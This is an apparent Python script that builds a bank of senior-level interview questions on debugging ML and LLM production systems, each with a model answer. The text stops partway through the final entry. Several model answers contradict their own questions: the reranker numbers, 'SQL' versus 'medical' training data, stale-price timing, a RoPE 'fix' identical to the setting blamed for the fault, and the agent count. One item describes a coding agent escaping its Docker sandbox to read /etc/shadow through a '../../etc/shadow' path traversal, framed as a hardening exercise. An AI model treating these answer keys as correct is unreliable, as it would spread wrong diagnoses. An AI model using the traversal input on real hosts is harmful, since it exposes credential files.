#!/usr/bin/env python3
"""Build 30 production debug questions for the 'Debug this' topic (Plan B5)."""
import json
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
SENIOR_FILE = ROOT / "src/data/interviewSeniorQuestions.json"

DEBUG_QUESTIONS = [
    [
        "debug-retrieval-recall-drop-reindex",
        "After re-indexing 2M documents with a new HNSW index in Milvus, top-10 retrieval recall dropped from 89% to 64% while query latency dropped from 42ms to 8ms. How do you triage this?",
        "When latency drops from 42ms down to 8ms while recall falls from 89% to 64%, my immediate instinct is that our graph traversal got cut short. I'd begin by looking at ef_search and M, while also sanity-checking vector normalization and confirming the distance metric matches the index schema. To isolate this, I would sweep ef_search between 16 and 256 against a held-out eval set, check dot products on unit vectors to rule out norm drift, and diff the collection's Terraform configuration. In this case, the root cause is that Terraform reset ef_search to a default of 16 instead of 128, terminating the beam search before exploring enough candidate neighbors. The immediate remedy is updating the client connection to set ef_search=128. Long-term, we guard against this by running an automated CI gate with 500 gold queries against any newly built index snapshot before flipping the production alias pointer.",
        [
            "How would you balance ef_search against throughput if query volume spikes by 10x?",
            "When would you prefer IVF-PQ over HNSW for a 2M vector collection?"
        ],
        [
            "Immediately retraining the embedding model because retrieval accuracy dropped.",
            "Assuming 2M documents is too large for HNSW and switching to brute-force flat search."
        ],
        [
            "debugging",
            "production-mlops"
        ],
        [
            "applied-ai-engineer",
            "ai-data-engineer"
        ],
        [
            "Increasing ef_search restores recall to 89% but increases query latency from 8ms to 38ms.",
            "Setting M higher during index build improves graph connectivity but increases index RAM by 30%."
        ],
        "senior"
    ],
    [
        "debug-continuous-batching-ttft-tail-spike",
        "After enabling continuous batching in vLLM with max_num_seqs=256, p50 time-to-first-token stayed flat at 110ms, but p99 TTFT jumped from 180ms to 2,850ms during peak 40 req/s load. What is happening?",
        "A flat p50 of 110ms paired with a p99 exploding to nearly three seconds points directly to head-of-line prefill blocking. I would examine whether large incoming prompts are starving active decodes, check if KV cache exhaustion is triggering recomputations, and inspect token budgets per step. To prove this, I'd correlate TTFT against prompt length percentiles during load spikes, track vLLM's num_preemptions metric, and check our max_num_batched_tokens ceiling. The issue here is prefill starvation: incoming 4k-token requests hogged the tensor cores for consecutive 800ms forward passes, keeping queued generations waiting. We fix this by enabling chunked prefill with enable_chunked_prefill=True and capping max_num_batched_tokens at 2048 so chunks interleave smoothly with decodes. For permanent isolation, we disaggregate prefill and decode onto dedicated GPU worker pools with KV cache transfer over the network.",
        [
            "What trade-off does chunked prefill introduce for pure batch throughput?",
            "How does KV cache transfer over RDMA perform compared to local recomputation?"
        ],
        [
            "Increasing max_num_seqs to 512 to absorb more parallel requests.",
            "Adding speculative decoding to reduce prefill compute overhead."
        ],
        [
            "debugging",
            "inference-serving"
        ],
        [
            "inference-engineer",
            "applied-ai-engineer"
        ],
        [
            "Chunked prefill bounds p99 TTFT under 250ms but slightly reduces aggregate batch generation throughput due to split attention kernels.",
            "Disaggregated serving isolates SLAs completely but adds network overhead for KV cache transfer between nodes."
        ],
        "senior"
    ],
    [
        "debug-eval-accuracy-up-complaints-up",
        "An offline LLM-as-a-judge benchmark for a financial advisory bot improved from 78% to 92% after prompt tuning, but live user thumbs-down complaints jumped from 4% to 19%. How do you diagnose this disconnect?",
        "When judge benchmark scores climb while real user dissatisfaction jumps from 4% to 19%, the evaluator and the user want opposite things. My primary suspects are length bias where the judge favors wordy outputs, rubric overfitting, or query distribution drift. I would diagnose this by plotting response word count against thumbs-down rates, running judge permutation tests on past failures to spot systematic rubric biases, and comparing cluster embeddings of production queries against the benchmark set. Here, the prompt change produced 600-word compliant legal essays that pleased the judge's static checklist, but mobile users wanted two direct sentences. The fix is re-constraining the prompt with strict brevity bounds and calibrating the judge rubric with negative penalties for verbosity. To stop this recurring, we calibrate automated judges against weekly samples of real production conversations scored by human reviewers.",
        [
            "How do you detect judge self-preference bias when evaluating model upgrades?",
            "What metrics quantify alignment between user feedback signals and automated offline judges?"
        ],
        [
            "Discarding user feedback as statistically noisy and relying solely on the 92% benchmark.",
            "Prompting the model to always agree with the user to artificially suppress complaints."
        ],
        [
            "debugging",
            "evaluation"
        ],
        [
            "ai-evaluation-reliability-engineer",
            "applied-ai-engineer"
        ],
        [
            "Shorter answers reduce mobile abandonment and complaint rates but risk omitting nuanced compliance caveats.",
            "Sampling live production data catches prompt regressions faster but requires scrubbing sensitive customer data."
        ],
        "senior"
    ],
    [
        "debug-agent-cost-doubled-prompt-change",
        "An agentic research assistant's average cost per completed task spiked from $0.04 to $0.18 within 24 hours of adding a system prompt instruction to 'verify all sources rigorously'. How do you isolate the cause?",
        "An overnight cost jump from 4 cents to 18 cents after a prompt change screams uncontrolled agent loop expansion. I would investigate three areas: the distribution of reasoning steps per run, token accumulation across conversation history, and whether external tool calls are cycling repeatedly. In OpenTelemetry, I would compare step count percentiles before and after the prompt push, chart cumulative context growth per step, and filter traces for duplicate API calls. What happened is the instruction 'verify all sources' triggered three to five recursive web searches for every single claim, ballooning the context past 45,000 tokens on multi-turn history. We fix this by bounding the prompt to 'verify using at most two sources', capping total reasoning steps at 8, and caching search results to prevent re-querying. In CI, we set strict token spend budgets and fail runs if step-count standard deviation shifts significantly.",
        [
            "How would you design a circuit breaker that aborts an agent before exceeding a tenant's dollar quota?",
            "Why does context compression sometimes degrade reasoning in multi-hop verification?"
        ],
        [
            "Switching to a much smaller model without addressing the recursive prompt loop.",
            "Removing all source verification to force single-turn answers."
        ],
        [
            "debugging",
            "agents"
        ],
        [
            "agentic-ai-engineer",
            "applied-ai-engineer"
        ],
        [
            "Strict step limits prevent runaway costs but force the agent to return incomplete answers on complex topics.",
            "Filtering web snippets reduces token usage by 70% but may drop critical context."
        ],
        "senior"
    ],
    [
        "debug-radix-cache-hit-rate-collapse",
        "In an SGLang serving cluster, prefix cache hit rate plummeted from 74% to 5% after releasing a user-personalization feature, causing throughput to collapse by 60%. How do you triage this?",
        "A prefix cache collapse from 74% down to 5% almost always means someone broke the invariant shared prefix. I'd inspect prompt serialization at the gateway, specifically checking whether dynamic user identifiers or timestamps got placed ahead of our shared instructions. To confirm, I would diff raw token sequences across consecutive requests in gateway logs and check radix tree depth in SGLang's internal metrics. The diagnosis is prefix fragmentation: the new feature prepended <user_id> and a timestamp at index zero, right before the static system prompt and few-shot demonstrations, ensuring no two requests ever shared a root. The resolution is reordering the template so static guidelines and tool schemas come first, placing user-specific variables and timestamps at the tail. To prevent this, our CI prompt linter now enforces that all prompts begin with static, cachable tokens.",
        [
            "How does RadixAttention eviction differ from traditional LRU cache eviction under memory pressure?",
            "Can you share prefix cache trees across multiple independent worker nodes?"
        ],
        [
            "Increasing GPU KV cache allocation to stop supposed cache evictions.",
            "Disabling the personalization feature entirely without fixing prompt token order."
        ],
        [
            "debugging",
            "inference-serving"
        ],
        [
            "inference-engineer",
            "platform-engineer"
        ],
        [
            "Placing static prompts first maximizes cache sharing but requires strict template standardization across client teams.",
            "Dynamic user context at the end may slightly alter cross-attention weighting on certain model architectures."
        ],
        "senior"
    ],
    [
        "debug-speculative-decoding-throughput-regression",
        "Enabling speculative decoding with a 1B draft model on a 70B target model reduced overall generation throughput by 22% on specialized legal contract queries, despite a 1.8x speedup on general chat. What is wrong?",
        "Seeing a 22% throughput regression on legal documents despite speedups on conversational chat points to low draft model acceptance rates. I would check the average accepted token length on legal terminology, profile kernel launch overhead on the target model, and inspect vocabulary alignment between draft and base models. We confirm this by logging the mean accepted tokens alpha per step—if it falls below 1.2 on contract text, speculative decoding will lose throughput to verification overhead. That's exactly what occurred: legal syntax and archaic phrasing dropped acceptance to 0.9 tokens, so the 70B model ran repeated validation passes without producing multi-token advances. The fix is dynamic draft gating: route through speculative decoding only when domain classifiers or prompt metadata predict acceptance length above 2.2, falling back to standard autoregressive decode otherwise. We maintain this by running regression evaluations across distinct domain slices rather than trusting single aggregate chat benchmarks.",
        [
            "What mathematical condition determines the breakeven acceptance rate for speculative speedup?",
            "How do draft heads like EAGLE avoid running a separate draft model?"
        ],
        [
            "Increasing draft length from K=5 to K=10 hoping more tokens get accepted.",
            "Blaming target model GPU memory bandwidth without measuring acceptance rates."
        ],
        [
            "debugging",
            "inference-serving"
        ],
        [
            "inference-engineer",
            "platform-engineer"
        ],
        [
            "Dynamic speculative fallback guarantees no performance regression on hard domains but adds tracking logic per stream.",
            "Training domain-specific draft heads increases acceptance rate but requires training and maintaining dedicated weights."
        ],
        "staff"
    ],
    [
        "debug-vector-similarity-inversion-short-queries",
        "After migrating an internal documentation search from a legacy 384-d bi-encoder to a 1536-d embedding model, 2-word queries like 'setup guide' return 0.98 cosine similarity for random unformatted text chunks. How do you triage this?",
        "When two-word queries match random boilerplate text at 0.98 cosine similarity, we are looking at embedding geometry collapse or missing normalization. I would inspect L2 normalization on query and document vectors, examine embedding anisotropy in the 1536-dimensional space, and check the token pooling method. We test this by calculating vector magnitudes before cosine computation and evaluating cosine similarity between random unrelated sentences. The root cause is unnormalized raw embeddings combined with anisotropy: raw vectors clustered along a dominant conical vector direction, causing dot products to reflect magnitude rather than directional alignment. The fix is ensuring L2 unit normalization at inference time and applying a query instruction prefix like 'Represent this sentence for searching relevant passages:'. We lock this down by asserting unit norms in vector database ingestion pipelines and validating short-query ranking against gold lexical sets.",
        [
            "Why do dense embedding models suffer from hubness in high dimensions?",
            "How does Matryoshka Representation Learning allow vector truncation without retraining?"
        ],
        [
            "Switching from cosine distance to Euclidean distance without testing normalization.",
            "Filtering out all chunks under 50 words to avoid matching short passages."
        ],
        [
            "debugging",
            "rag"
        ],
        [
            "applied-ai-engineer",
            "ai-data-engineer"
        ],
        [
            "Prepending query instructions improves retrieval accuracy by 25% but adds preprocessing dependencies to client calls.",
            "Enforcing L2 normalization enables dot-product search speedups but discards vector magnitude information."
        ],
        "mid"
    ],
    [
        "debug-w4a16-quantized-repetitive-loop",
        "A 70B model quantized to W4A16 with AWQ runs cleanly on English benchmarks, but users testing in Spanish and Hindi report the model gets stuck repeating the same phrase until max_tokens. What is the root cause and fix?",
        "A quantized model looping repetitively in non-English languages indicates calibration dataset bias during quantization. I would inspect the linguistic distribution of the AWQ calibration corpus, check activation outlier clipping on key projections, and review repetition penalty settings in inference. We verify this by measuring perplexity across Spanish, Hindi, and English evaluation sets and logging top-token logits on looped sequences. The diagnosis is that the calibration corpus was entirely English Wikipedia, so Spanish and Hindi activations exceeded clipped FP16 bounds, distorting attention weights and trapping generation in degenerate loops. The fix is recalibrating AWQ with a balanced multilingual corpus containing at least 20% target non-English tokens and setting group_size=64 instead of 128 for sensitive projections. We enforce this by requiring multilingual perplexity verification gates on all quantized model deployment artifacts.",
        [
            "Why are activation outliers more destructive in weight-only quantization than in W8A8?",
            "How does smoothquant handle activation outliers compared to AWQ?"
        ],
        [
            "Increasing temperature to 1.5 to break repetitive generation loops.",
            "Writing a regex post-processor to delete repeated sentences in the streaming output."
        ],
        [
            "debugging",
            "gpu-memory-quantization"
        ],
        [
            "inference-engineer",
            "applied-ai-engineer"
        ],
        [
            "Multilingual calibration prevents catastrophic degeneration across languages but takes longer to compute during quantization build pipelines.",
            "Raising repetition penalty suppresses loops but causes awkward word substitutions in structured languages."
        ],
        "senior"
    ],
    [
        "debug-streaming-disconnect-quota-leak",
        "A production LLM gateway's Redis token bucket rate limiter ran out of tenant quota under moderate load, with 40% of users receiving 429 errors despite consuming only 20% of their allocated daily tokens. What is leaking tokens?",
        "When 40% of users hit 429 rate limits despite consuming only a fifth of their token budget, rate limiter token leakage is occurring during client drop-offs. I'd investigate client disconnect handling on streaming endpoints, inspect the timing of Redis token debits relative to generation completion, and verify atomic rollback logic. To test this, I'd simulate client aborts mid-stream with curl and compare Redis bucket decrements against actual tokens written to the socket. The root cause is optimistic token debiting: the gateway debited the full requested max_tokens upfront in Redis, but failed to refund ungenerated tokens when clients disconnected after reading the first sentence. The solution is reserving an initial safety margin, debiting actual streamed tokens in 50-token chunks as chunks flush, and settling the exact count in a finally block on socket close. To protect against drift, we run an hourly reconciliation job comparing gateway access logs with Redis tenant balances.",
        [
            "How do you ensure token refunds execute reliably if the gateway container crashes?",
            "Why can't you simply charge tokens on every streamed chunk rather than reserving up front?"
        ],
        [
            "Doubling every tenant's quota to stop the 429 rate limit errors.",
            "Removing the up-front token reservation, allowing malicious tenants to run infinite concurrent streams."
        ],
        [
            "debugging",
            "production-mlops"
        ],
        [
            "platform-engineer",
            "applied-ai-engineer"
        ],
        [
            "Up-front token reservation with refund prevents overdrafts but requires robust disconnection listeners.",
            "Per-token streaming billing eliminates reservation logic but creates extreme write pressure on Redis."
        ],
        "senior"
    ],
    [
        "debug-agent-tool-call-json-parse-failure",
        "After swapping a 70B model for a fine-tuned 8B model in an agent service, tool-calling JSON parsing failures surged from 0.2% to 14.8%, causing agent tasks to crash with syntax errors. How do you resolve this?",
        "A jump in tool-calling JSON parse errors from 0.2% to nearly 15% after moving to an 8B model reflects weaker schema compliance and unconstrained token generation. I would examine the fine-tuned model's function-calling syntax, check whether constrained grammar decoding is active, and inspect temperature settings during tool selection. We isolate this by logging the raw strings that failed JSON.parse and validating the output format against the training prompt template. The diagnosis is that the 8B model occasionally outputs trailing commas, unescaped quotes, or conversational preambles before the JSON payload when run without grammar constraints. The immediate fix is enforcing JSON schema decoding using Outlines or vLLM guided decoding with guided_json, alongside setting temperature to zero for tool calls. We prevent future regressions by running tool-calling contract tests against 200 synthetic edge cases in CI before promoting any small model to production.",
        [
            "What latency overhead does grammar-guided decoding add to token generation?",
            "How can you repair malformed JSON client-side when constrained decoding is unavailable?"
        ],
        [
            "Promising in the system prompt 'You must output valid JSON without mistakes' and hoping error rates drop.",
            "Discarding the 8B model immediately and reverting to 70B without testing constrained decoding."
        ],
        [
            "debugging",
            "agents"
        ],
        [
            "agentic-ai-engineer",
            "applied-ai-engineer"
        ],
        [
            "Grammar-guided decoding guarantees 100% syntactically valid JSON but adds small regex state-machine overhead to next-token logits masking.",
            "Client-side partial JSON parsers handle trailing commas but cannot fix semantic argument errors."
        ],
        "senior"
    ],
    [
        "debug-ddp-nan-loss-divergence",
        "During 8-node Distributed Data Parallel pre-training with BF16, training loss was stable for 4,000 steps, then suddenly produced NaN loss at step 4,210. How do you identify the cause and recover?",
        "A sudden NaN loss at step 4,210 after thousands of stable steps points to an activation explosion, an unmasked sequence anomaly, or mixed-precision underflow. I would inspect the dataset batch at step 4,210 for corrupt or zero-length sequences, check gradient norms across layers prior to the crash, and review learning rate warmup and optimizer state values. To identify the trigger, I would isolate batch 4,210 and replay it through a single worker with torch.autograd.set_detect_anomaly(True) while inspecting attention softmax inputs. The cause is an unmasked zero-length sequence in the data pipeline that produced a row of all -inf in the attention matrix, turning softmax into NaNs that poisoned backpropagation. The fix is adding strict minimum token length filters (min_tokens >= 4) in the DataLoader and enabling gradient clipping at max_norm=1.0 to bound sudden updates. We prevent recurrence by restoring from the step 4,200 checkpoint with the faulty batch filtered, and adding pre-tokenization validation in data preparation pipelines.",
        [
            "Why does BF16 still experience NaN values if it has the same dynamic range as FP32?",
            "How does gradient clipping protect AdamW optimizer states from single-batch anomalies?"
        ],
        [
            "Restarting training from step 4,210 without inspecting data or reloading an earlier clean checkpoint.",
            "Switching entire training run to FP64 without identifying the source of NaN."
        ],
        [
            "debugging",
            "deep-learning"
        ],
        [
            "platform-engineer",
            "applied-ai-engineer"
        ],
        [
            "Dropping all-pad batches prevents zero-denominator crashes but requires dynamic batch reconstruction in the loader.",
            "Strict gradient clipping stabilizes training against loss spikes but can slow down gradient progress during initial convergence."
        ],
        "senior"
    ],
    [
        "debug-rope-extrapolation-hallucination-spike",
        "After increasing an open-weight LLM's context window from 8k to 32k by modifying RoPE base frequency rope_theta from 10,000 to 500,000 in config.json, answers beyond 12k tokens show high hallucination rates and garbled syntax. What happened?",
        "When extending context from 8k to 32k without fine-tuning, severe hallucination at long distances is the classic signature of RoPE frequency extrapolation failure. I would check whether RoPE base frequency theta was scaled, inspect attention entropy at token positions beyond 8,192, and test needle-in-a-haystack retrieval across context depths. We prove this by plotting attention weight distributions across positions 1k to 30k; an unscaled RoPE will show uniform or collapsed attention scores at high position indices. The root cause is that raw RoPE cannot extrapolate to unseen position offsets without frequency adjustment, because rotational angles wrap around and produce out-of-distribution inner products. The fix is applying YaRN or dynamic NTK-aware scaling by increasing base frequency theta from 10,000 to 500,000, or applying a frequency scaling factor of 4.0. We guard against this by running automated needle-in-a-haystack recall benchmarks across the full 32k range before certifying context window expansions.",
        [
            "What is the difference between RoPE interpolation and RoPE frequency scaling?",
            "Why does YaRN apply different scaling factors to low-frequency versus high-frequency dimensions?"
        ],
        [
            "Continuing to increase rope_theta to 10,000,000 to solve the long-context degradation.",
            "Truncating all production queries back to 8k tokens and giving up on long context."
        ],
        [
            "debugging",
            "transformers"
        ],
        [
            "applied-ai-engineer",
            "inference-engineer"
        ],
        [
            "YaRN enables long context with minimal fine-tuning but requires careful per-dimension frequency tuning.",
            "Fine-tuning on 32k sequences restores accuracy but requires substantial compute and GPU memory for long-context batches."
        ],
        "senior"
    ],
    [
        "debug-cross-encoder-reranker-latency-breach",
        "A RAG pipeline's p99 latency jumped from 320ms to 2,100ms, breaching production SLA, after increasing cross-encoder reranker candidate pool size from 25 to 100 documents. How do you fix this while keeping recall high?",
        "A reranking latency leap from 65ms to 840ms when candidate count rises from 20 to 100 indicates quadratic cross-encoder computation scaling under batching constraints. I would evaluate the candidate count fed to the cross-encoder, inspect GPU batch size and padding efficiency during inference, and check sequence length distribution across query-document pairs. We confirm this by profiling reranker latency with candidate pools from 20 to 100 and measuring TensorRT-LLM or ONNX batch execution times. The root cause is that a cross-encoder concatenates the query with every document, so scoring 100 candidates with 512 tokens each requires evaluating 51,200 tokens across heavy self-attention layers on a single GPU. The remedy is adopting a two-stage reranking pipeline: score 100 candidates with a fast bi-encoder or lightweight ColBERT late-interaction model, then forward only the top-20 candidates to the heavy cross-encoder. We enforce this by setting a strict SLA timeout and hard ceiling of 25 candidates on the cross-encoder API gateway.",
        [
            "Why is ColBERT late interaction orders of magnitude faster than a cross-encoder?",
            "How does document token truncation affect cross-encoder precision on long passages?"
        ],
        [
            "Replacing the cross-encoder with BM25 keyword matching and discarding semantic reranking.",
            "Increasing HTTP timeout from 1,500ms to 5,000ms to avoid SLA breach alerts."
        ],
        [
            "debugging",
            "rag"
        ],
        [
            "applied-ai-engineer",
            "inference-engineer"
        ],
        [
            "Two-stage cascaded reranking keeps p99 under 180ms while retaining 96% of cross-encoder recall, but adds an intermediate indexing service.",
            "Truncating document chunks to 200 tokens speeds up reranking but risks missing answers split across chunk boundaries."
        ],
        "senior"
    ],
    [
        "debug-guided-json-decoding-throughput-collapse",
        "Serving throughput for structured JSON extraction plummeted from 42 tokens/sec to 4 tokens/sec after introducing an updated Pydantic schema with nested union types and complex regex fields in Outlines. How do you debug and resolve this?",
        "When guided JSON decoding drops throughput by 70%, regex finite-state-machine masking is bottlenecking CPU token generation. I would profile CPU utilization on the serving node during token generation, inspect the complexity of the JSON schema regex, and check FSM state transition caching. We isolate this by profiling the vLLM worker process with py-spy and measuring the time spent in the grammar mask compilation step versus GPU forward passes. The root cause is that an intricate JSON schema with unbounded nested arrays caused the regex engine to compute allowed token masks dynamically on the CPU for every token position, stalling the GPU. We fix this by compiling the JSON schema into an optimized prefix DFA ahead of time using Outlines or xgrammar, and simplifying schemas to avoid deeply recursive structures. We prevent this by benchmarking JSON schema grammar compilation overhead in CI and requiring pre-compiled DFAs before registering structured output endpoints.",
        [
            "How does XGrammar optimize logit masking on the GPU compared to CPU-based Outlines?",
            "When should you use two-pass generation instead of guided decoding?"
        ],
        [
            "Removing all JSON structure validation and trusting raw string prompting.",
            "Assuming the GPU is underpowered and adding more compute without profiling the FSM."
        ],
        [
            "debugging",
            "prompting-structured-output"
        ],
        [
            "inference-engineer",
            "applied-ai-engineer"
        ],
        [
            "Simplifying schemas and precompiling FSMs restores throughput to 38 tok/s but may allow slightly looser string formats.",
            "Two-pass unconstrained generation eliminates token masking overhead but risks retries if the JSON is invalid."
        ],
        "senior"
    ],
    [
        "debug-lora-catastrophic-forgetting-reasoning",
        "A LoRA adapter fine-tuned on internal SQL schemas achieved 95% execution accuracy on SQL generation, but general reasoning and math benchmark scores collapsed from 84% to 28%. How do you diagnose and fix this forgetting?",
        "When domain fine-tuning causes a 45% drop in general mathematical reasoning, the adapter is suffering catastrophic forgetting from narrow data distribution and unconstrained parameter updates. I would check the fine-tuning dataset composition for general reasoning exemplars, examine the LoRA target modules, and inspect the learning rate and epoch count. We verify this by evaluating checkpoints at every 100 steps on GSM8k alongside domain accuracy, and inspecting gradient norms across adapter weights. The cause is training exclusively on domain medical texts at a high learning rate across all linear projection layers (q, k, v, o, gate, up, down), which overwrote foundational reasoning representations. The fix is mixing in a 15% replay buffer of general math and reasoning demonstrations into the training corpus, restricting LoRA to attention projections (q_proj, v_proj), and reducing learning rate by half. We guard against this by setting automated regression gates on GSM8k and MMLU that abort training runs if general performance drops by more than 3%.",
        [
            "Why does targeting only query and value projection matrices reduce catastrophic forgetting?",
            "How does replay buffer ratio balance domain specialization against general reasoning retention?"
        ],
        [
            "Training an entirely new foundation model from scratch for SQL.",
            "Freezing the model completely and relying solely on few-shot prompting."
        ],
        [
            "debugging",
            "post-training"
        ],
        [
            "applied-ai-engineer",
            "platform-engineer"
        ],
        [
            "Mixing 15% general replay data protects reasoning abilities but slightly lowers domain SQL accuracy from 95% to 92%.",
            "Using lower LoRA rank reduces memory and prevents forgetting but may limit capacity for complex novel domains."
        ],
        "senior"
    ],
    [
        "debug-guardrail-redos-cpu-starvation",
        "A Kubernetes pod running an input security guardrail crashed with Out Of Memory and 100% CPU utilization whenever users submitted text containing repeated special characters like !@#!@# 5,000 times. What is the vulnerability and remediation?",
        "A sudden CPU spike to 100% and gateway timeouts on specific prompts indicates regular expression catastrophic backtracking in an input guardrail. I would inspect the regex patterns deployed in PII masking and prompt injection filters, capture the specific user inputs that triggered timeouts, and analyze regex execution time against input length. We reproduce this by testing the suspected regexes against repeating character sequences using Python's re module with timing instrumentation. The root cause is a nested quantifier like (a+)+ in an email or PII detection pattern that caused exponential backtracking when presented with long repetitive text payloads. The fix is replacing vulnerable patterns with linear-time regex engines like Google's re2, or refactoring the regexes to eliminate overlapping groups and setting execution timeouts. To prevent future incidents, we add CI automated regex security linters using tools like rxxr2 to flag catastrophic backtracking risks before deployment.",
        [
            "Why is Google RE2 immune to catastrophic backtracking compared to PCRE or Python re?",
            "How should an ingress gateway handle payloads that exceed the guardrail size limit?"
        ],
        [
            "Increasing Kubernetes CPU limits from 2 cores to 16 cores to absorb the regex spike.",
            "Removing the guardrail entirely to restore API availability."
        ],
        [
            "debugging",
            "safety"
        ],
        [
            "platform-engineer",
            "applied-ai-engineer"
        ],
        [
            "Switching to RE2 guarantees O(N) evaluation time but eliminates support for backreferences and lookaround assertions.",
            "Enforcing an 8KB payload cap prevents ReDoS attacks but blocks legitimate long-document processing."
        ],
        "mid"
    ],
    [
        "debug-semantic-cache-stale-pricing-data",
        "A customer-facing retail chatbot returned outdated product pricing from three months ago for 12% of queries, despite the backend pricing database updating hourly. How do you triage the semantic cache?",
        "Returning stale discount codes 12 hours after a database update indicates the semantic vector cache lacks an invalidation bridge to tabular data. I would check the cache TTL settings, inspect cache entry metadata for entity dependency tracking, and review whether write paths notify the cache layer. We verify this by querying the cache with paraphrase variations and checking the timestamp and source document IDs stored in cache records. The diagnosis is that the semantic cache used a static 24-hour TTL based purely on query vector similarity, with no connection to the SQL pricing catalog when prices changed. The fix is implementing tag-based cache invalidation: store pricing SKU IDs in cache entry metadata and purge matching cache entries whenever a database pricing update event publishes to Redis or Kafka. We ensure reliability by setting maximum TTLs to 15 minutes for dynamic business entities and adding cache bypass headers for transactional checkout queries.",
        [
            "How does exact lexical filtering before semantic vector search prevent cross-entity cache pollution?",
            "What is the trade-off between cache hit rate and accuracy when raising semantic similarity thresholds?"
        ],
        [
            "Disabling semantic caching entirely and routing all queries to the LLM.",
            "Assuming the LLM hallucinated the price and ignoring the caching layer."
        ],
        [
            "debugging",
            "cost-capacity"
        ],
        [
            "applied-ai-engineer",
            "platform-engineer"
        ],
        [
            "Raising similarity threshold to 0.95 drops cache hit rate from 35% to 18% but eliminates stale price leaks.",
            "Partitioning cache keys by SKU requires extracting product entities before cache lookup, adding 10ms preprocessing latency."
        ],
        "senior"
    ],
    [
        "debug-multi-agent-debate-deadlock",
        "A multi-agent consensus system (generator, critic, refiner) hangs indefinitely on 8% of requests when debate iterations reach round 3, timing out after 120 seconds. Where is the deadlock and how do you resolve it?",
        "A multi-agent debate stalling at token budget limits without consensus means the agents entered an ungrounded rhetorical deadlock. I would analyze the conversation turns between the two agents, check the consensus termination conditions in the orchestrator, and inspect how new evidence is introduced. We diagnose this by plotting semantic similarity between consecutive agent statements—if similarity remains high while arguments repeat, the system is deadlocked. The root cause is a symmetric prompt design that rewarded defending prior points without providing an external arbiter or access to grounding verification tools. The solution is introducing an independent judge agent that evaluates arguments after three rounds, enforces a maximum debate turn limit of 4, and injects factual retrieval results when disagreement persists. We safeguard against infinite debate loops by bounding maximum debate turns and scoring consensus convergence in multi-agent integration tests.",
        [
            "How do you detect cycle loops in multi-agent state graphs automatically?",
            "When should an orchestrator fail gracefully to a human operator versus returning the highest-confidence draft?"
        ],
        [
            "Increasing the timeout from 120s to 300s to give agents more time to agree.",
            "Removing the critic agent and letting the generator output single-pass answers."
        ],
        [
            "debugging",
            "multi-agent"
        ],
        [
            "agentic-ai-engineer",
            "applied-ai-engineer"
        ],
        [
            "Terminating debate at round 3 prevents deadlocks and bounds latency, but may occasionally return non-unanimous answers.",
            "Adding an adjudicator agent resolves deadlocks cleanly but adds cost for contested queries."
        ],
        "senior"
    ],
    [
        "debug-voice-vad-speech-clipping",
        "Users of an interactive voice bot report that the bot cuts them off mid-sentence and starts responding whenever they pause for more than 400ms to think. What parameters in the speech pipeline are misconfigured?",
        "When an interactive voice agent truncates the start of sentences and cuts off reflective pauses, the Voice Activity Detection thresholds are misconfigured. I would inspect the VAD energy and probability thresholds, check speech-start padding durations, and analyze the silence duration required before triggering end-of-speech. We isolate this by feeding recorded conversational audio with natural hesitations through the VAD and comparing detected speech boundaries against manual ground truth. The root cause is that silence timeout was set to an aggressive 400ms to minimize latency, while start-of-speech required 300ms of sustained volume without a pre-speech audio buffer. The fix is increasing the silence cutoff to 800ms (or using Silero VAD with speech_pad_ms=250), and buffering 200ms of pre-trigger audio to preserve sentence-initial consonants. We maintain speech quality by validating VAD configurations against a benchmark corpus of conversational speech containing natural 1-second hesitation pauses.",
        [
            "How can an LLM predict whether a user has finished speaking based on partial transcripts?",
            "What is the latency trade-off between increasing VAD silence duration and responsive turn-taking?"
        ],
        [
            "Telling users to speak faster and avoid pausing in conversation.",
            "Disabling VAD completely and relying on push-to-talk buttons only."
        ],
        [
            "debugging",
            "multimodal"
        ],
        [
            "applied-ai-engineer",
            "inference-engineer"
        ],
        [
            "Increasing silence duration to 750ms eliminates interruptions but increases overall turn-taking response latency by 350ms.",
            "Semantic completion models reduce premature turn-taking but add lightweight inference overhead to the speech loop."
        ],
        "mid"
    ],
    [
        "debug-coding-agent-path-traversal-sandbox",
        "During security auditing of a coding agent running in Docker, the agent successfully read /etc/shadow and modified host files outside the designated /workspace folder. How was the sandbox bypassed and how do you harden it?",
        "A coding agent escaping its workspace and accessing host files indicates incomplete container isolation and insecure volume mounting. I would inspect the Docker volume mount flags, review user privilege mappings and Linux capabilities in the container manifest, and examine the agent's tool execution code. We reproduce the breach by checking if the container runs as root, testing relative path traversal like ../../etc/shadow, and inspecting the output of mount inside the container. The root cause is that Docker was launched with -v /host:/workspace without user namespacing, running as root with default capabilities, allowing the agent to resolve parent paths beyond /workspace. The fix is running the container with an unprivileged user (--user 1000:1000), mounting only an isolated ephemeral directory with read-only root (--read-only), dropping all capabilities (--cap-drop=ALL), and enforcing path canonicalization in Python before tool execution. We ensure sandbox integrity by running automated penetration tests in CI that verify restricted directory access fails.",
        [
            "Why is running containers with a read-only root filesystem effective against sandbox escapes?",
            "How does gVisor or Firecracker provide stronger kernel isolation than standard Docker?"
        ],
        [
            "Relying on a prompt instruction telling the agent 'Do not access /etc'.",
            "Blocking file tools with basic string filters like checking for '..' without canonicalizing paths."
        ],
        [
            "debugging",
            "sandboxes"
        ],
        [
            "platform-engineer",
            "agentic-ai-engineer"
        ],
        [
            "Dropping all root capabilities and making the root filesystem read-only prevents escapes but requires pre-installing all runtime dependencies.",
            "MicroVM sandboxes provide near-perfect kernel isolation but have slightly higher startup overhead than Docker."
        ],
        "staff"
    ],
    [
        "debug-feature-store-skew-timestamp-alignment",
        "A real-time transaction fraud model scored 0.88 PR-AUC in offline backtests, but dropped to 0.52 PR-AUC in online shadow deployment within 48 hours. How do you detect and fix the training-serving skew?",
        "An offline PR-AUC of 0.88 collapsing to 0.52 in production indicates point-in-time leakage during offline training dataset construction. I would examine the feature store query logic used for historical training data, check timestamp alignment between feature updates and label events, and compare offline versus online feature distributions. We diagnose this by comparing feature histograms between training sets and production serving logs, and calculating Kolmogorov-Smirnov statistics to detect distribution shift. The root cause is future data leakage: the offline training query joined features using the transaction processing timestamp rather than the transaction occurrence timestamp, incorporating fraud labels that materialized hours later. The remedy is rewriting the feature join using point-in-time correct queries (such as Feast or Hopsworks asof joins) to ensure feature snapshots reflect only data available at decision time. We prevent future skew by running automated data drift monitors and requiring point-in-time correctness checks on all training dataset generation scripts.",
        [
            "How do AS OF joins prevent target leakage in streaming event feature pipelines?",
            "What is the difference between data drift, concept drift, and training-serving skew?"
        ],
        [
            "Retraining the model with more historical data without fixing the leak in the SQL join.",
